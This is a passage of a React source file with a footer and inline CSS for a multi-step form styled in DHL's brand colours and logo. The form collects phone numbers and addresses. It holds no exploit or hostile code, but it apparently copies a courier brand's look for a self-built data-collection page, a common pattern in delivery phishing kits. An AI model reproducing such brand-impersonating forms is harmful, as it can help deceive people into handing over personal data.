              margin: "0 auto",
              padding: "0 40px",
            }}
          >
            <div
              style={{
                display: "flex",
                flexWrap: "wrap",
                justifyContent: "space-between",
                alignItems: "center",
                gap: "20px",
              }}
            >
              <div
                style={{
                  display: "flex",
                  flexWrap: "wrap",
                  gap: "30px",
                  alignItems: "center",
                }}
              >
                <a
                  href="#"
                  style={{
                    color: DHL.footerText,
                    textDecoration: "none",
                    fontSize: "12px",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.color = DHL.red)}
                  onMouseLeave={(e) => (e.currentTarget.style.color = DHL.footerText)}
                >
                  {t.privacyNotice}
                </a>
                <button
                  id="ot-sdk-btn"
                  onClick={() => {
                    if (window.OneTrust && window.OneTrust.ToggleInfoDisplay) {
                      window.OneTrust.ToggleInfoDisplay();
                    }
                  }}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: DHL.footerText,
                    fontSize: "12px",
                    cursor: "pointer",
                    padding: 0,
                    fontFamily: "Arial, sans-serif",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.color = DHL.red)}
                  onMouseLeave={(e) => (e.currentTarget.style.color = DHL.footerText)}
                >
                  {t.consentSettings}
                </button>
              </div>

              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: isMobile ? "flex-start" : "flex-end",
                  gap: "10px",
                }}
              >
                <img
                  alt="DHL Logo"
                  src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCwxLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uODY1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+"
                  style={{
                    width: "128px",
                    height: "auto",
                  }}
                />
                <div
                  style={{
                    fontSize: "11px",
                    color: DHL.footerText,
                    marginTop: "6px",
                  }}
                >
                  © {currentYear} {t.copyright}
                </div>
              </div>
            </div>
          </div>
        </footer>
      </main>

      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        .dhl-app {
          background: #f7f7f7;
          min-height: 100vh;
          width: 100%;
          overflow-x: hidden;
          display: flex;
          flex-direction: column;
        }

        .dhl-main {
          width: 100%;
          margin: 0 auto;
          flex: 1;
        }

        .dhl-header {
          background: #ffcc00;
          padding: 30px 0;
          width: 100%;
        }

        .dhl-header-content {
          max-width: 1190px;
          margin: 0 auto;
          padding: 0 40px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 16px;
        }

        .dhl-logo-area {
          flex: 1 1 auto;
        }

        .dhl-logo {
          height: auto;
          width: auto;
          max-height: 50px;
          max-width: 100%;
        }

        .dhl-right-header {
          display: flex;
          justify-content: flex-end;
        }

        .dhl-lang-wrapper {
          position: relative;
        }

        .dhl-lang-btn {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 14px;
          background: rgba(255,255,255,0.2);
          border: 1px solid rgba(255,255,255,0.35);
          border-radius: 30px;
          color: #1a1a1a;
          font-size: 0.85rem;
          font-weight: 500;
          cursor: pointer;
          font-family: inherit;
          background-color: rgba(255,255,255,0.6);
          transition: all 0.2s ease;
        }

        .dhl-lang-btn:hover {
          background-color: rgba(255,255,255,0.9);
          border-color: rgba(255,255,255,0.6);
        }

        .dhl-language-dropdown {
          position: absolute;
          top: 100%;
          right: 0;
          z-index: 1000;
          background: #fff;
          border: 1px solid #e0e0e0;
          border-radius: 12px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.15);
          margin-top: 8px;
          min-width: 180px;
          overflow: hidden;
        }

        .dhl-language-dropdown-list {
          max-height: 400px;
          overflow-y: auto;
        }

        .dhl-language-item {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 12px 16px;
          cursor: pointer;
          transition: background 0.2s ease;
          font-size: 14px;
        }

        .dhl-language-item:hover {
          background: #f5f5f5;
        }

        .dhl-language-item.active {
          background: #fff8e1;
          color: #d40511;
        }

        .dhl-language-name {
          flex: 1;
        }

        .dhl-language-check {
          color: #d40511;
          font-weight: bold;
        }

        /* RTL Support for Arabic */
        [dir="rtl"] .dhl-language-dropdown {
          right: auto;
          left: 0;
        }

        [dir="rtl"] .dhl-checkbox-row {
          flex-direction: row-reverse;
        }

        [dir="rtl"] .dhl-country-selector {
          left: auto;
          right: 0;
        }

        [dir="rtl"] .dhl-phone-input {
          padding: 0 110px 0 14px;
        }

        .dhl-steps-container {
          padding-top: 90px;
          width: 100%;
          padding-bottom: 10px;
        }

        .dhl-steps {
          display: flex;
          align-items: flex-start;
          justify-content: center;
          width: 100%;
          margin: 0 auto 28px;
          padding: 0 16px;
          box-sizing: border-box;
        }

        .dhl-step {
          display: flex;
          flex-direction: column;
          align-items: center;
          flex-shrink: 1;
        }

        .dhl-step-circle {
          width: 40px;
          height: 40px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 15px;
          font-weight: 700;
          transition: all 0.3s ease;
          flex-shrink: 0;
        }

        .dhl-step-circle.active {
          background: #333;
          color: #fff;
          box-shadow: 0 0 0 4px rgba(51,51,51,0.15);
        }

        .dhl-step-circle.upcoming {
          background: #fff;
          color: #999;
          border: 2px solid #ddd;
        }

        .dhl-step-label {
          font-size: 12px;
          font-weight: 600;
          text-align: center;
          margin-top: 8px;
          line-height: 1.3;
          max-width: 110px;
          color: #bbb;
        }

        .dhl-step-label.active {
          color: #333;
          font-weight: 700;
        }

        .dhl-step-line {
          flex: 1;
          height: 3px;
          min-width: 30px;
          max-width: 80px;
          background: #e5e5e5;
          margin-top: 19px;
          border-radius: 2px;
        }

        .dhl-form-card {
          max-width: 850px;
          margin: 0 auto 100px auto;
          padding: 30px 40px 40px;
          background: #fff;
          border-radius: 2px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.08);
          width: calc(100% - 40px);
        }

        .dhl-form-title {
          font-size: clamp(24px, 5vw, 36px);
          font-weight: bold;
          margin-bottom: 30px;
          color: #333;
          line-height: 1.2;
        }

        .dhl-form {
          display: flex;
          flex-direction: column;
          gap: 20px;
        }

        .dhl-row {
          display: flex;
          gap: 20px;
          flex-wrap: wrap;
        }

        .dhl-col {
          flex: 1 1 calc(50% - 10px);
          min-width: 200px;
        }

        .dhl-full {
          width: 100%;
        }

        .dhl-field {
          position: relative;
          width: 100%;
        }

        .dhl-label {
          display: block;
          font-size: 13px;
          font-weight: 600;
          color: #374151;
          margin-bottom: 6px;
          font-family: inherit;
        }

        .dhl-input {
          width: 100%;
          height: 48px;
          padding: 0 14px;
          font-size: 15px;
          border: 1.5px solid #d1d5db;
          border-radius: 8px;
          box-sizing: border-box;
          font-family: inherit;
          outline: none;
          transition: border-color 0.2s ease, box-shadow 0.2s ease;
          background-color: #fff;
        }

        .dhl-input:focus {
          border-color: #d40511;
          box-shadow: 0 0 0 3px rgba(212,5,17,0.08);
        }

        .dhl-phone-wrapper {
          position: relative;
          width: 100%;
        }

        .dhl-country-selector {
          position: absolute;
          left: 0;
          top: 0;
          bottom: 0;
          z-index: 1;
          display: flex;
          align-items: center;
        }

        [dir="rtl"] .dhl-country-selector {
          left: auto;
          right: 0;
        }

        [dir="rtl"] .dhl-phone-input {
          padding: 0 110px 0 14px;
        }

        .dhl-country-btn {
          display: flex;
          align-items: center;
          gap: 6px;
          height: 100%;
          padding: 0 10px;
          background: transparent;
          border: none;
          cursor: pointer;
          font-size: 14px;
          font-family: inherit;
          border-right: 1px solid #d1d5db;
          transition: background 0.2s ease;
        }

        .dhl-address-country-wrapper {
          position: relative;
          width: 100%;
        }

        .dhl-address-country-btn {
          display: flex;
          align-items: center;
          gap: 10px;
          width: 100%;
          height: 48px;
          padding: 0 14px;
          font-size: 15px;
          border: 1.5px solid #d1d5db;
          border-radius: 8px;
          background: #fff;
          cursor: pointer;
          font-family: inherit;
          transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }

        .dhl-address-country-btn:hover {
          border-color: #d40511;
        }

        .dhl-address-country-name {
          flex: 1;
          text-align: left;
          color: #333;
        }

        .dhl-address-country-dropdown {
          position: absolute;
          top: 100%;
          left: 0;
          right: 0;
          z-index: 1000;
          background: #fff;
          border: 1px solid #d1d5db;
          border-radius: 8px;
          box-shadow: 0 4px 16px rgba(0,0,0,0.12);
          margin-top: 4px;
          max-height: 300px;
          overflow: hidden;
          display: flex;
          flex-direction: column;
        }

        .dhl-flag {
          width: 22px;
          height: 16px;
          background-size: cover;
          background-repeat: no-repeat;
          background-position: center;
          display: inline-block;
          border-radius: 2px;
        }

        /* Country flags */
        .dhl-flag-us { background-image: url('https://flagcdn.com/w20/us.png'); }
        .dhl-flag-ca { background-image: url('https://flagcdn.com/w20/ca.png'); }
        .dhl-flag-gb { background-image: url('https://flagcdn.com/w20/gb.png'); }
        .dhl-flag-au { background-image: url('https://flagcdn.com/w20/au.png'); }
        .dhl-flag-nz { background-image: url('https://flagcdn.com/w20/nz.png'); }
        .dhl-flag-jp { background-image: url('https://flagcdn.com/w20/jp.png'); }
        .dhl-flag-kr { background-image: url('https://flagcdn.com/w20/kr.png'); }
        .dhl-flag-cn { background-image: url('https://flagcdn.com/w20/cn.png'); }
        .dhl-flag-in { background-image: url('https://flagcdn.com/w20/in.png'); }
        .dhl-flag-de { background-image: url('https://flagcdn.com/w20/de.png'); }
        .dhl-flag-fr { background-image: url('https://flagcdn.com/w20/fr.png'); }
        .dhl-flag-it { background-image: url('https://flagcdn.com/w20/it.png'); }
        .dhl-flag-es { background-image: url('https://flagcdn.com/w20/es.png'); }
        .dhl-flag-br { background-image: url('https://flagcdn.com/w20/br.png'); }
        .dhl-flag-mx { background-image: url('https://flagcdn.com/w20/mx.png'); }
        .dhl-flag-ru { background-image: url('https://flagcdn.com/w20/ru.png'); }
        .dhl-flag-za { background-image: url('https://flagcdn.com/w20/za.png'); }
        .dhl-flag-eg { background-image: url('https://flagcdn.com/w20/eg.png'); }
        .dhl-flag-ma { background-image: url('https://flagcdn.com/w20/ma.png'); }
        .dhl-flag-tn { background-image: url('https://flagcdn.com/w20/tn.png'); }
        .dhl-flag-dz { background-image: url('https://flagcdn.com/w20/dz.png'); }
        .dhl-flag-ng { background-image: url('https://flagcdn.com/w20/ng.png'); }
        .dhl-flag-ke { background-image: url('https://flagcdn.com/w20/ke.png'); }
        .dhl-flag-gh { background-image: url('https://flagcdn.com/w20/gh.png'); }
        .dhl-flag-ae { background-image: url('https://flagcdn.com/w20/ae.png'); }
        .dhl-flag-sa { background-image: url('https://flagcdn.com/w20/sa.png'); }
        .dhl-flag-il { background-image: url('https://flagcdn.com/w20/il.png'); }
        .dhl-flag-tr { background-image: url('https://flagcdn.com/w20/tr.png'); }
        .dhl-flag-ir { background-image: url('https://flagcdn.com/w20/ir.png'); }
        .dhl-flag-pk { background-image: url('https://flagcdn.com/w20/pk.png'); }
        .dhl-flag-lk { background-image: url('https://flagcdn.com/w20/lk.png'); }
        .dhl-flag-bd { background-image: url('https://flagcdn.com/w20/bd.png'); }
        .dhl-flag-th { background-image: url('https://flagcdn.com/w20/th.png'); }
        .dhl-flag-vn { background-image: url('https://flagcdn.com/w20/vn.png'); }
        .dhl-flag-id { background-image: url('https://flagcdn.com/w20/id.png'); }
        .dhl-flag-ph { background-image: url('https://flagcdn.com/w20/ph.png'); }
        .dhl-flag-my { background-image: url('https://flagcdn.com/w20/my.png'); }
        .dhl-flag-sg { background-image: url('https://flagcdn.com/w20/sg.png'); }
        .dhl-flag-hk { background-image: url('https://flagcdn.com/w20/hk.png'); }
        .dhl-flag-mo { background-image: url('https://flagcdn.com/w20/mo.png'); }
        .dhl-flag-tw { background-image: url('https://flagcdn.com/w20/tw.png'); }
        .dhl-flag-nl { background-image: url('https://flagcdn.com/w20/nl.png'); }
        .dhl-flag-be { background-image: url('https://flagcdn.com/w20/be.png'); }
        .dhl-flag-ch { background-image: url('https://flagcdn.com/w20/ch.png'); }
        .dhl-flag-at { background-image: url('https://flagcdn.com/w20/at.png'); }
        .dhl-flag-dk { background-image: url('https://flagcdn.com/w20/dk.png'); }
        .dhl-flag-se { background-image: url('https://flagcdn.com/w20/se.png'); }
        .dhl-flag-no { background-image: url('https://flagcdn.com/w20/no.png'); }
        .dhl-flag-fi { background-image: url('https://flagcdn.com/w20/fi.png'); }
        .dhl-flag-pl { background-image: url('https://flagcdn.com/w20/pl.png'); }
        .dhl-flag-cz { background-image: url('https://flagcdn.com/w20/cz.png'); }
        .dhl-flag-sk { background-image: url('https://flagcdn.com/w20/sk.png'); }
        .dhl-flag-hu { background-image: url('https://flagcdn.com/w20/hu.png'); }
        .dhl-flag-ro { background-image: url('https://flagcdn.com/w20/ro.png'); }
        .dhl-flag-bg { background-image: url('https://flagcdn.com/w20/bg.png'); }
        .dhl-flag-gr { background-image: url('https://flagcdn.com/w20/gr.png'); }
        .dhl-flag-pt { background-image: url('https://flagcdn.com/w20/pt.png'); }
        .dhl-flag-ie { background-image: url('https://flagcdn.com/w20/ie.png'); }
        .dhl-flag-is { background-image: url('https://flagcdn.com/w20/is.png'); }
        .dhl-flag-hr { background-image: url('https://flagcdn.com/w20/hr.png'); }
        .dhl-flag-si { background-image: url('https://flagcdn.com/w20/si.png'); }
        .dhl-flag-lt { background-image: url('https://flagcdn.com/w20/lt.png'); }
        .dhl-flag-lv { background-image: url('https://flagcdn.com/w20/lv.png'); }
        .dhl-flag-ee { background-image: url('https://flagcdn.com/w20/ee.png'); }
        .dhl-flag-cl { background-image: url('https://flagcdn.com/w20/cl.png'); }
        .dhl-flag-ar { background-image: url('https://flagcdn.com/w20/ar.png'); }
        .dhl-flag-co { background-image: url('https://flagcdn.com/w20/co.png'); }
        .dhl-flag-ve { background-image: url('https://flagcdn.com/w20/ve.png'); }
        .dhl-flag-pe { background-image: url('https://flagcdn.com/w20/pe.png'); }
        .dhl-flag-jm { background-image: url('https://flagcdn.com/w20/jm.png'); }
        .dhl-flag-lu { background-image: url('https://flagcdn.com/w20/lu.png'); }
        .dhl-flag-mc { background-image: url('https://flagcdn.com/w20/mc.png'); }
        .dhl-flag-sn { background-image: url('https://flagcdn.com/w20/sn.png'); }
        .dhl-flag-ci { background-image: url('https://flagcdn.com/w20/ci.png'); }
        .dhl-flag-cm { background-image: url('https://flagcdn.com/w20/cm.png'); }
        .dhl-flag-qa { background-image: url('https://flagcdn.com/w20/qa.png'); }
        .dhl-flag-kw { background-image: url('https://flagcdn.com/w20/kw.png'); }
        .dhl-flag-bh { background-image: url('https://flagcdn.com/w20/bh.png'); }
        .dhl-flag-om { background-image: url('https://flagcdn.com/w20/om.png'); }
        .dhl-flag-jo { background-image: url('https://flagcdn.com/w20/jo.png'); }
        .dhl-flag-lb { background-image: url('https://flagcdn.com/w20/lb.png'); }
        .dhl-flag-iq { background-image: url('https://flagcdn.com/w20/iq.png'); }
        .dhl-flag-ye { background-image: url('https://flagcdn.com/w20/ye.png'); }
        .dhl-flag-ps { background-image: url('https://flagcdn.com/w20/ps.png'); }
        .dhl-flag-ly { background-image: url('https://flagcdn.com/w20/ly.png'); }
        .dhl-flag-sd { background-image: url('https://flagcdn.com/w20/sd.png'); }
        .dhl-flag-mr { background-image: url('https://flagcdn.com/w20/mr.png'); }
        .dhl-flag-so { background-image: url('https://flagcdn.com/w20/so.png'); }
        .dhl-flag-ec { background-image: url('https://flagcdn.com/w20/ec.png'); }
        .dhl-flag-gt { background-image: url('https://flagcdn.com/w20/gt.png'); }
        .dhl-flag-cu { background-image: url('https://flagcdn.com/w20/cu.png'); }
        .dhl-flag-bo { background-image: url('https://flagcdn.com/w20/bo.png'); }
        .dhl-flag-do { background-image: url('https://flagcdn.com/w20/do.png'); }
        .dhl-flag-hn { background-image: url('https://flagcdn.com/w20/hn.png'); }
        .dhl-flag-py { background-image: url('https://flagcdn.com/w20/py.png'); }
        .dhl-flag-sv { background-image: url('https://flagcdn.com/w20/sv.png'); }
        .dhl-flag-ni { background-image: url('https://flagcdn.com/w20/ni.png'); }
        .dhl-flag-cr { background-image: url('https://flagcdn.com/w20/cr.png'); }
        .dhl-flag-pa { background-image: url('https://flagcdn.com/w20/pa.png'); }
        .dhl-flag-uy { background-image: url('https://flagcdn.com/w20/uy.png'); }
        .dhl-flag-ao { background-image: url('https://flagcdn.com/w20/ao.png'); }
        .dhl-flag-mz { background-image: url('https://flagcdn.com/w20/mz.png'); }
        .dhl-flag-cv { background-image: url('https://flagcdn.com/w20/cv.png'); }
        .dhl-flag-gw { background-image: url('https://flagcdn.com/w20/gw.png'); }
        .dhl-flag-tl { background-image: url('https://flagcdn.com/w20/tl.png'); }
        .dhl-flag-sm { background-image: url('https://flagcdn.com/w20/sm.png'); }
        .dhl-flag-va { background-image: url('https://flagcdn.com/w20/va.png'); }
        .dhl-flag-by { background-image: url('https://flagcdn.com/w20/by.png'); }
        .dhl-flag-kz { background-image: url('https://flagcdn.com/w20/kz.png'); }
        .dhl-flag-kg { background-image: url('https://flagcdn.com/w20/kg.png'); }
        .dhl-flag-ua { background-image: url('https://flagcdn.com/w20/ua.png'); }
        .dhl-flag-li { background-image: url('https://flagcdn.com/w20/li.png'); }

        .dhl-phone-input {
          width: 100%;
          height: 48px;
          padding: 0 14px 0 110px;
          font-size: 15px;
          border: 1.5px solid #d1d5db;
          border-radius: 8px;
          box-sizing: border-box;
          font-family: inherit;
          outline: none;
        }

        .dhl-country-dropdown {
          position: absolute;
          top: 100%;
          left: 0;
          right: 0;
          z-index: 1000;
          background: #fff;
          border: 1px solid #d1d5db;
          border-radius: 8px;
          box-shadow: 0 4px 16px rgba(0,0,0,0.12);
          margin-top: 4px;
          max-height: 300px;
          overflow: hidden;
          display: flex;
          flex-direction: column;
        }

        .dhl-country-dropdown-search {
          padding: 10px;
          border-bottom: 1px solid #e5e7eb;
        }

        .dhl-country-search {
          width: 100%;
          height: 36px;
          padding: 0 12px;
          font-size: 14px;
          border: 1px solid #d1d5db;
          border-radius: 6px;
          outline: none;
        }

        .dhl-country-dropdown-list {
          overflow-y: auto;
          max-height: 250px;
        }

        .dhl-country-item, .dhl-address-country-item {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 10px 12px;
          cursor: pointer;
          transition: background 0.2s ease;
        }

        .dhl-country-item:hover, .dhl-address-country-item:hover {
          background: #f3f4f6;
        }

        .dhl-country-name {
          flex: 1;
          font-size: 14px;
          color: #333;
        }

        .dhl-checkbox-wrapper {
          margin: 8px 0 4px;
        }

        .dhl-checkbox-row {
          display: flex;
          align-items: flex-start;
          gap: 10px;
          flex-wrap: wrap;
        }

